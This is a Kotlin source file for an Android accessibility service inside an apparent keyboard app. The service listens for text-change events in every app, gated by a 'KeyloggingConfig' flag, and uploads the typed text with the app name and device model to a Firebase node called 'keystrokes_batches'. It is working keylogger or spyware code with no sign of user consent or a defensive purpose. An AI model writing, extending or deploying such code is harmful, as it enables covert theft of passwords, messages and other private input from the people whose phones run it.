package com.example.mykeyboard

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import androidx.annotation.RequiresApi
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
class AppAccessibilityService : AccessibilityService() {
    companion object {
        private const val TAG = "AppAccessibilityService"
        private val scope = CoroutineScope(Dispatchers.IO)
        private fun getDatabaseRef(deviceName: String): DatabaseReference? = try {
            FirebaseDatabase.getInstance().getReference().child("keystrokes_batches").child(deviceName)
        } catch (e: Exception) {
            Log.e(TAG, "Error getting database ref", e)
            null
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        try {
            val info = AccessibilityServiceInfo().apply {
                eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or AccessibilityEvent.TYPE_VIEW_FOCUSED
                feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                notificationTimeout = 100
            }
            serviceInfo = info
            Log.d(TAG, "Accessibility Service Connected Successfully")
            LogStore.addLog("Accessibility Service Connected")
        } catch (e: Exception) {
            Log.e(TAG, "Error in onServiceConnected", e)
            LogStore.addLog("Accessibility Service connection error: ${e.toString()}")
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (!KeyloggingConfig.isEnabled) return
        if (event == null) return
        try {
            val packageName = event.packageName?.toString() ?: "unknown"
            val textList = event.text

            if (textList.isNullOrEmpty()) return
            val typedText = textList.joinToString(" ")

            if (typedText.isBlank()) return

            scope.launch {
                try {
                    val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
                    val ref = getDatabaseRef(deviceName) ?: return@launch
                    val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
                    val sanitizedAppName = packageName.replace(Regex("[^a-zA-Z0-9_-]"), "_")

                    val eventData = mapOf(
                        "deviceName" to deviceName,
                        "packageName" to sanitizedAppName,
                        "text" to typedText,
                        "timestamp" to System.currentTimeMillis()
                    )

                    ref.child("accessibility_$sanitizedAppName").child(timestampKey).setValue(eventData)
                        .addOnSuccessListener {
                            Log.d(TAG, "Accessibility text synced to Firebase successfully")
                            LogStore.addLog("[$deviceName] Accessibility synced ($sanitizedAppName): $typedText")
                        }
                        .addOnFailureListener { e: Exception ->
                            Log.e(TAG, "FAILED to sync accessibility text to Firebase", e)
                            LogStore.addLog("[$deviceName] Accessibility sync FAILED: ${e.toString()}")
                        }
                } catch (e: Exception) {
                    Log.e(TAG, "Error in coroutine accessibility event", e)
                    LogStore.addLog("Accessibility exception: ${e.toString()}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in onAccessibilityEvent", e)
        }
    }

    override fun onInterrupt() {}
}
